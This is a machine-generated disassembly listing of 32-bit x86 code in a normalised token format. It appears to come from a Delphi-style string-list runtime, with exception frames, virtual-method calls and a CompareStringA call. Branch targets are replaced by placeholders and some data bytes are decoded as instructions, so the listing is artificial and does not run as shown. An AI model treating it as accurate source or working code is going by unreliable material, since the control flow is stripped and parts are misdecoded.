mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7b6b5
mov eax [ ebp - 0x4 ]
call sub_3a7b850
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_3a7b6dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7b77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
movzx eax [ esi + 0xd ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd ] al
movzx eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] al
movzx eax [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ esi + 0x8 ]
call sub_3a652f4
movzx eax [ esi + 0xe ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xe ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7b850
retn
sub_3a7b7ac
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a7b864
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_3a7b804
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_3a7bfcc
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push ebp
call sub_3a7b7ac
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7b864
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7b8f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7b900
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_3a652c4
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_3a656c8
jne r-xdata
sub_3a7b910
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_3a7b90c
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
jmp sub_3a64c34
sub_3a7b948
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7b990
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a67194
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_3a7b910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7b997
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7b9a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7ba7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7ba56
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ba5d
mov eax [ ebp - 0x8 ]
call sub_3a7b850
retn
sub_3a7ba98
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7badd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3a65730
call sub_3a6a394
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bae4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7baec
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a7bc15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3a7c3e8
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
call sub_3a65390
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bc1c
lea eax [ ebp - 0x24 ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
add edx eax
add [ ebp - 0x18 ] edx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub edx 0x4
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx ebx
call sub_3a63154
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov ecx ebx
call sub_3a63154
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_3a7bc24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7bc9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bca3
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_3a7bcb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7bd73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_3a7c48c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_3a65488
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_3a6e0bc
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bd7a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7bd84
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_3a7bdb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a7bde8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7be30
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7be37
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7be3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7bed9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7bebc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_3a7cb9c
sub esi eax
lea eax [ ebp - 0x4 ]
mov ecx esi
xor edx edx
call sub_3a65390
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bec3
mov eax [ ebp - 0x8 ]
call sub_3a7b850
retn
sub_3a7bee8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7bf89
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bf90
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x8 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7bf6c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a7b850
retn
sub_3a7bf98
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a7bfcc
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7c070
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a7f07c
mov eax [ ebp - 0x4 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7c04b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a7dfc8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a7fdac
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c052
mov eax [ ebp - 0x4 ]
call sub_3a7b850
retn
sub_3a7c07c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_3a7d0b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7c0c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c0ce
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7c0d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7c125
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax esi
call sub_3a7ce00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c12c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub eax 0x4
mov eax [ eax ]
sub_3a7c138
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_3a66ccc
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_3a7c16c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7c1af
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65498
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c1b6
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7c1bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7c345
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a7b794
xor edx edx
push ebp
push sub_3a7c313
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c31a
mov eax [ ebp - 0x8 ]
call sub_3a7b850
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_3a7c3e8
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_3a692f8
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
jmp r-xdata
mov eax sub_3a6e188
mov [ ebp - 0x10 ] eax
mov eax sub_3a6a30c
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7c3e8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov esi ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_3a7c3e8
mov eax [ ebp - 0x20 ]
call sub_3a65730
mov edx eax
mov eax ebx
call [ ebp - 0x10 ]
mov edi eax
jmp r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65390
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub al 0x3
jne r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65390
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi ebx
jne r-xdata
cmp edi ebx
jne r-xdata
inc ebx
inc ebx
mov eax [ ebp - 0xc ]
add ebx eax
inc ebx
sub_3a7c31a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c34c
lea eax [ ebp - 0x20 ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7c357
inc [ edx ]
add [ eax ] al
add [ 0xffffffffc300000a ] cl
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7c3da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a81420
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a81428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c3e1
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3a82c78
inc esi
dec ebx
jne r-xdata
sub_3a7c3e8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x4 ] 0x8
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a652f4
pop esi
pop ebx
retn
mov edx r-xdata
mov eax ebx
call sub_3a7c41c
sub_3a7c41c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_3a656c8
jne r-xdata
or [ ebx + 0x4 ] 0x8
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a652f4
test [ ebx + 0x4 ] 0x8
jne r-xdata
pop esi
pop ebx
retn
sub_3a7c448
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_3a65730
push eax
push ebx
mov eax edi
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_3a7c4a4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xd ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0xd ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_3a7c4c0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7b5ac
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x1c ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_3a65e38
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7c52c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
movzx eax [ ebx + 0x25 ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_3a7b948
jmp r-xdata
sub_3a7c5c8
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x1c ]
mov edx [ r-xdata ]
call sub_3a65e38
xor eax eax
mov [ ebx + 0x1c ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a7c608
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x18 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_3a63154
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_3a65f24
dec [ ebx + 0x1c ]
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
sub_3a7c674
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_3a7b948
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_3a7b948
cmp edi [ ebx + 0x1c ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a7c6d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
